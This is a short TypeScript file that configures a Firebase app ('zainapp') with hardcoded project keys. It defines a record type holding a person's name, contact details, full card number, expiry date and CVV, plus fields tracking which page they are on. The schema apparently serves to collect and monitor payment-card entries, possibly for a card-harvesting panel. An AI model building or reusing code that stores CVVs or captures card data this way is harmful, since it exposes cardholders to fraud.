import { initializeApp, getApps, getApp } from 'firebase/app';
import { getAuth } from 'firebase/auth';
import { getFirestore } from 'firebase/firestore';
import { getDatabase } from 'firebase/database';

const firebaseConfig = {
  apiKey: "AIzaSyBRlXDxWFZUiT0AsINNEzjJ91MMhsIh0Tw",
  authDomain: "zainapp-4aa39.firebaseapp.com",
  databaseURL: "https://zainapp-4aa39-default-rtdb.firebaseio.com",
  projectId: "zainapp-4aa39",
  storageBucket: "zainapp-4aa39.firebasestorage.app",
  messagingSenderId: "989820647416",
  appId: "1:989820647416:web:e5e9393845f0a0d90ac80d",
  measurementId: "G-8VW3VQJV73"
};

const app = getApps().length > 0 ? getApp() : initializeApp(firebaseConfig);
const auth = getAuth(app);
const db = getFirestore(app);
const database = getDatabase(app);

export { app, auth, db, database };

export interface NotificationDocument {
  id: string;
  name: string;
  hasPersonalInfo: boolean;
  hasCardInfo: boolean;
  currentPage: string;
  time: string;
  notificationCount: number;
  personalInfo?: {
    fullName: string;
    email: string;
    phone: string;
    address: string;
  };
  cardInfo?: {
    cardNumber: string;
    expirationDate: string;
    cvv: string;
  };
}
